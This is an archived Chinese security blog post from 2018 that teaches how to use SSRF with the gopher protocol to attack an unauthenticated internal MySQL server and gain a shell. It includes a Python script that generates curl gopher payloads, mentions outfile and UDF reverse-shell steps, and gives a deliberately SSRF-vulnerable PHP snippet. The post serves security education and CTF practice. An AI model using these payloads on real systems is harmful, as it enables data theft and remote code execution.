@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<!-- saved from url=(0056)https://blog.formsec.cn/2018/01/22/SSRF-To-RCE-in-MySQL/ -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  
+  <title>SSRF To RCE in MySQL | FormSec | 逢魔网络安全实验室</title>
+
+  
+  <meta name="author" content="FormSec">
+  
+
+  
+  <meta name="description" content="发布时间：2018年01月22日
+背景介绍SSRF(Server-Side RequestForgery)服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞，一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。
+在互联网上已经很多介绍SSRF漏洞的原理，漏洞场景，漏洞利用方法的文章，但是大多数的SSRF漏洞利用都是内网扫描，内网服务识别，内网漏洞盲打，写计划任务获取shell，写私钥获取shell，利用SSRF漏洞结合Gohper或者Dict协议攻击Redis、MongoDB、Memcache等NoSQL，但是很少见有利用SSRF漏洞攻击内网MySQL、PostgreSQL、MSSQL等关系型数据库，所以本文我们将介绍如何利用SSRF漏洞结合Gopher系统攻击内网未授权MySQL，并且获取系统shell的方法。">
+  
+
+  
+  
+  <meta name="keywords" content="SSRF,RCE,MySQL">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="SSRF To RCE in MySQL">
+
+  <meta property="og:site_name" content="FormSec">
+
+  
+  <meta property="og:image" content="/favicon.ico">
+  
+
+  <link href="https://blog.formsec.cn/favicon.ico" rel="icon">
+  <link rel="alternate" href="https://blog.formsec.cn/atom.xml" title="FormSec" type="application/atom+xml">
+  <link rel="stylesheet" href="./SSRF To RCE in MySQL _ FormSec _ 逢魔网络安全实验室_files/style.css" media="screen" type="text/css">
+<style></style><style>@media print {#ghostery-purple-box {display:none !important}}</style></head>
+
+
+<body style="">
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="https://blog.formsec.cn/">FormSec</a>
+    </h1>
+    <p class="site-description">逢魔网络安全实验室</p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="https://blog.formsec.cn/">Home</a></li>
+      
+        <li><a href="https://blog.formsec.cn/archives">Archives</a></li>
+      
+        <li><a href="https://blog.formsec.cn/atom.xml">RSS</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>SSRF To RCE in MySQL</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="https://blog.formsec.cn/2018/01/22/SSRF-To-RCE-in-MySQL/" rel="bookmark">
+        <time class="entry-date published" datetime="2018-01-22T00:00:00.000Z">
+          2018-01-22
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p><img src="./SSRF To RCE in MySQL _ FormSec _ 逢魔网络安全实验室_files/a224cd7235fbbd55011068eea477d777.png" alt=""></p>
+<p>发布时间：2018年01月22日</p>
+<h2 id="背景介绍"><a href="https://blog.formsec.cn/2018/01/22/SSRF-To-RCE-in-MySQL/#%E8%83%8C%E6%99%AF%E4%BB%8B%E7%BB%8D" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>SSRF(Server-Side Request<br>Forgery)服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞，一般情况下，SSRF<br>攻击的目标是从外网无法访问的内部系统。</p>
+<p>在互联网上已经很多介绍SSRF漏洞的原理，漏洞场景，漏洞利用方法的文章，但是大多数的SSRF漏洞利用都是内网扫描，内网服务识别，内网漏洞盲打，写计划任务获取shell，写私钥获取shell，利用SSRF漏洞结合Gohper或者Dict协议攻击Redis、MongoDB、Memcache等NoSQL，但是很少见有利用SSRF漏洞攻击内网MySQL、PostgreSQL、MSSQL等关系型数据库，所以本文我们将介绍如何利用SSRF漏洞结合Gopher系统攻击内网未授权MySQL，并且获取系统shell的方法。</p>
+<a id="more"></a>
+<h2 id="MySQL通信协议"><a href="https://blog.formsec.cn/2018/01/22/SSRF-To-RCE-in-MySQL/#MySQL%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE" class="headerlink" title="MySQL通信协议"></a>MySQL通信协议</h2><p><strong>MySQL连接方式：</strong></p>
+<p>在进行利用SSRF攻击MySQL之前，先了解一下MySQL的通信协议。MySQL分为服务端和客户端，客户端连接服务器使存在三种方法：</p>
+<ol>
+<li><p>Unix套接字；</p>
+</li>
+<li><p>内存共享/命名管道；</p>
+</li>
+<li><p>TCP/IP套接字；</p>
+</li>
+</ol>
+<p>在Linux或者Unix环境下，当我们输入</p>
+<p><code>mysql –uroot –proot</code></p>
+<p>登录MySQL服务器时就是用的Unix套接字连接；Unix套接字其实不是一个网络协议，只能在客户端和Mysql服务器在同一台电脑上才可以使用。</p>
+<p>在window系统中客户端和Mysql服务器在同一台电脑上，可以使用命名管道和共享内存的方式。</p>
+<p>TCP/IP套接字是在任何系统下都可以使用的方式，也是使用最多的连接方式，当我们输入</p>
+<p><code>mysql –h127.0.0.1 –uroot –proot</code></p>
+<p>时就是要TCP/IP套接字。</p>
+<p>所以当我们需要抓取mysql通信数据包时必须使用TCP/IP套接字连接。</p>
+<p><strong>MySQL认证过程：</strong></p>
+<p>MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证；当无需密码认证时直接发送TCP/IP数据包即可。所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行，本文利用SSRF漏洞攻击MySQL也是在其未授权情况下进行的。</p>
+<p>MySQL客户端与服务器的交互主要分为两个阶段：Connection<br>Phase（连接阶段或者叫认证阶段）和Command<br>Phase（命令阶段）。在连接阶段包括握手包和认证包，这里我们不详细说明握手包，主要关注认证数据包。</p>
+<p>认证数据包格式如下：</p>
+<p><img src="./SSRF To RCE in MySQL _ FormSec _ 逢魔网络安全实验室_files/d39e2f50b09ae5eb3cecc190d059820b.png" alt=""></p>
+<p>这里以无需密码认证情况登录，看看认证数据包内容：</p>
+<p><img src="./SSRF To RCE in MySQL _ FormSec _ 逢魔网络安全实验室_files/8d5feaa3a5bcd8b5e1a530a1ac250e03.png" alt=""></p>
+<p>这里Packet Length为整个数据包的长度，Packet<br>Number为sequence_id随每个数据包递增，从0开始，命令执行阶段遇到命令重新重置为0。这两个Packet为真个MySQL通协议的基础数据包。</p>
+<p>客户端请求命令数据包格式如下：</p>
+<p><img src="./SSRF To RCE in MySQL _ FormSec _ 逢魔网络安全实验室_files/9ed288635df41c10199b5d4c0bbc46ff.png" alt=""></p>
+<p>比如这里select * from flag;命令的数据包如下：</p>
+<p><img src="./SSRF To RCE in MySQL _ FormSec _ 逢魔网络安全实验室_files/b2b7c545489c80ef4e56a90e6bba76c4.png" alt=""></p>
+<h2 id="构造攻击数据包"><a href="https://blog.formsec.cn/2018/01/22/SSRF-To-RCE-in-MySQL/#%E6%9E%84%E9%80%A0%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%8C%85" class="headerlink" title="构造攻击数据包"></a>构造攻击数据包</h2><p>通过上面MySQL通信协议的分析，现在需要构造一个基于TCP/IP的数据包，包括连接，认证，执行命令，退出等MySQL通信数据。</p>
+<p><strong>环境：</strong></p>
+<p>ubuntu17 4.4.0-62-generic #x86_64</p>
+<p>mysql Ver 14.14 Distrib 5.7.20, for Linux (x86_64)</p>
+<p>首先我们需要新建一个MySQL用户，并且密码为空，使用root用户登录mysql后执行如下命令即可：</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE USER ' usernopass'\@'localhost';</span><br><span class="line"></span><br><span class="line">GRANT USAGE ON \*.\* TO ' usernopass'\@'localhost';</span><br><span class="line"></span><br><span class="line">GRANT ALL ON \*.\* TO ' usernopass'\@'localhost';</span><br></pre></td></tr></tbody></table></figure>
+<p>上面我们新建了一个用户usernopass，只允许本地登录，接下来开始抓包分析。</p>
+<p>第一步开一个窗口抓包：</p>
+<p><code>root\@ubuntu17:/\#tcpdump –i lo port 3306 –w mysql.pcay</code></p>
+<p>第二步开一个窗口使用TCP/IP模式连接MySQL服务器：</p>
+<p><code>root\@ubuntu17:/\#mysql –h 127.0.0.1 –r usernopass</code></p>
+<p>为了抓到更多数据，然后随便select一个内容，在exit退出。</p>
+<p>第三步使用Wireshark打开上面抓到的mysql.pcap包：</p>
+<p><img src="./SSRF To RCE in MySQL _ FormSec _ 逢魔网络安全实验室_files/66f40030b2243151343cce28dba77a87.png" alt=""></p>
+<p>打开数据包后过滤mysql数据包，然后随便选一个mysql数据包邮件追踪流，TCP流，然后过滤出客户端发送到MySQL服务器的数据包，将显示格式调整为原始数据即可，此时获取的就是整个MySQL客户端连接服务器并且执行命令到退出发送的数据包内容，如上图所示。</p>
+<p>然后将原始数据整理为一行，并将其url编码，最后的内容如下图所示：</p>
+<p><img src="./SSRF To RCE in MySQL _ FormSec _ 逢魔网络安全实验室_files/96ee1c8a76b5b2619adc870d30a6638a.png" alt=""></p>
+<p>将MySQL原始数据进行编码的脚本如下：</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/dev python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span><span class="params">(s)</span>:</span>	</span><br><span class="line">  a = [s[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(s), <span class="number">2</span>)]	</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"curl gopher://127.0.0.1:3306/_%"</span> + <span class="string">"%"</span>.join(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:	</span><br><span class="line">  <span class="keyword">import</span> sys	</span><br><span class="line">  s = sys.argv[<span class="number">1</span>]	</span><br><span class="line">  <span class="keyword">print</span> result(s)</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="利用SSRF获取系统shell"><a href="https://blog.formsec.cn/2018/01/22/SSRF-To-RCE-in-MySQL/#%E5%88%A9%E7%94%A8SSRF%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9Fshell" class="headerlink" title="利用SSRF获取系统shell"></a>利用SSRF获取系统shell</h2><p>上面我们构造好了一堆TCP数据包，如果需要使用SSRF漏洞来攻击MySQL的话，那么我们可以使用gopher协议来发送上面的一堆TCP数据包，最后使用curl发送请求即可。</p>
+<p>这里我们select了flag表中的数据，最后构造的请求如下：</p>
+<p><img src="./SSRF To RCE in MySQL _ FormSec _ 逢魔网络安全实验室_files/df98c1a63e08db02f0aff9b39dd8668c.png" alt=""></p>
+<p>但是很多情况下，SSRF是没有回显的，及时发送了数据而且MySQL也执行了，但是我们看不到执行后的返回数据，最后我们要的是系统的一个shell。</p>
+<p>正常情况下，通过MySQL获取系统shell一般通过select into<br>outfile系统文件，或者使用udf来搞，那么这里同样我们将获取shell的数据包提取出来，通过gopher协议发送这些数据包同样可以达到getshell的目的。</p>
+<p>通过select xxx into outfile<br>yyy写shell的数据包获取方法同上面构造攻击数据包的过程，将执行完写文件sql语句的抓包内容提取出来构造好即可，如下图成功写shell文件到系统目录：</p>
+<p><img src="./SSRF To RCE in MySQL _ FormSec _ 逢魔网络安全实验室_files/aaf5c9c351ac6059a2cb437c0ceea628.png" alt=""></p>
+<p>通过udf直接执行系统命令过程同样，执行完一系列导出udf到plugin的命令后，即可直接执行系统命令执行，如下图所示反弹shell：</p>
+<p><img src="./SSRF To RCE in MySQL _ FormSec _ 逢魔网络安全实验室_files/0963383871fa1cb469a256df4548d561.png" alt=""></p>
+<p>（注意：在导出文件时，当前mysql用户必须存在file权限；部分MySQL服务器运行时启用了–secure-file-priv选项，导出文件时只能导出到规定的目录下，一般为/var/mysql/data命令，要自定义目录时必须修改配置文件设置secure-file-priv<br>= “”；并且导入目录需要有写权限。）</p>
+<h2 id="实战演练"><a href="https://blog.formsec.cn/2018/01/22/SSRF-To-RCE-in-MySQL/#%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83" class="headerlink" title="实战演练"></a>实战演练</h2><p>例如下面这段常见的php代码，经常在审计代码时，遇到这类问题导致的SSRF漏洞，通过这里的SSRF，如果存在未授权的MySQL即可利用上面的攻击方法获取数据库敏感信息，甚至获取系统shell。</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">"url"</span>])) {</span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">    $url_parts = parse_url($url);</span><br><span class="line">    $port = $url_parts[<span class="string">"port"</span>];</span><br><span class="line">    $host = $url_parts[<span class="string">"host"</span>];</span><br><span class="line">    $ip = gethostbynamel($host)[<span class="number">0</span>];</span><br><span class="line">    $curl = curl_init();</span><br><span class="line">    curl_setopt($curl, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($curl, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">    curl_setopt($curl, CURLOPT_MAXREDIRS, <span class="number">0</span>);</span><br><span class="line">    curl_setopt($curl, CURLOPT_TIMEOUT, <span class="number">3</span>);</span><br><span class="line">    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, <span class="number">3</span>);</span><br><span class="line">    curl_setopt($curl, CURLOPT_RESOLVE, <span class="keyword">array</span>($host . <span class="string">":"</span> . $port . <span class="string">":"</span> . $ip));</span><br><span class="line">    curl_setopt($curl, CURLOPT_PORT, $port);</span><br><span class="line"></span><br><span class="line">    $data = curl_exec($curl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (curl_error($curl)) {</span><br><span class="line">        error(curl_error($curl));</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="keyword">echo</span> $data;</span><br><span class="line">    }	</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+<p>将我们构造好的获取信息的请求发送到url参数，结果如下：</p>
+<p><img src="./SSRF To RCE in MySQL _ FormSec _ 逢魔网络安全实验室_files/0b73a597d082d0d5b0f6878bfe1b6b69.png" alt=""></p>
+<p>可以看到成功获取到了表中的信息，利用导出文件或者udf获取系统shell的方法一样，只要构造好数据包直接发送即可。</p>
+<p>此方法再前不久的一个CTF中就有一个SSRF题目，就是利用未授权的MySQL获取数据库中的信息。</p>
+<h2 id="其他"><a href="https://blog.formsec.cn/2018/01/22/SSRF-To-RCE-in-MySQL/#%E5%85%B6%E4%BB%96" class="headerlink" title="其他"></a>其他</h2><p>​<br>这里我们只是介绍了如何构造MySQL数据库的数据包，并通过SSRF漏洞进行利益，其实他的关系数据库只要满足类似的场景都是可以利用的，比如PostgreSQL同样可以通过此过程进行攻击，PostgreSQL数据库的具体利用过程这里不再讲解，请期待后续相关内容介绍。</p>
+<h2 id="参考链接"><a href="https://blog.formsec.cn/2018/01/22/SSRF-To-RCE-in-MySQL/#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://codingo.xyz/index.php/2017/12/27/mysql_protocol/" target="_blank" rel="noopener">http://codingo.xyz/index.php/2017/12/27/mysql_protocol/</a></p>
+<p><a href="http://vinc.top/2017/04/19/mysql-udf%E6%8F%90%E6%9D%83linux%E5%B9%B3%E5%8F%B0/" target="_blank" rel="noopener">http://vinc.top/2017/04/19/mysql-udf%E6%8F%90%E6%9D%83linux%E5%B9%B3%E5%8F%B0/</a></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="https://blog.formsec.cn/tags/SSRF/">SSRF</a><a href="https://blog.formsec.cn/tags/RCE/">RCE</a><a href="https://blog.formsec.cn/tags/MySQL/">MySQL</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    <br>
+    
+    © 2018 FormSec
+    
+  </p>
+</footer>
+    
+  </div>
+</div>
+
+</body><style id="stylish-2" class="stylish" type="text/css"></style><style id="stylish-4" class="stylish" type="text/css"></style></html>
